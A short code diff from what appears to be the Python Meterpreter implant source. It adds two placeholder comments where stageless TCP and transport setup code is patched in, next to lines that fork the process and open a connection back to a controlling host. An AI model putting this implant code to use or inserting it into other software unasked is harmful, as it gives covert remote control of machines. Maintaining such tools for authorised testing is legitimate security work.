@@ -1106,6 +1106,8 @@ if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
 	if HTTP_CONNECTION_URL and has_urllib:
 		transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT)
 	else:
+		# PATCH-SETUP-STAGELESS-TCP-SOCKET #
 		transport = TcpTransport.from_socket(s)
 	met = PythonMeterpreter(transport)
+	# PATCH-SETUP-TRANSPORTS #
 	met.run()
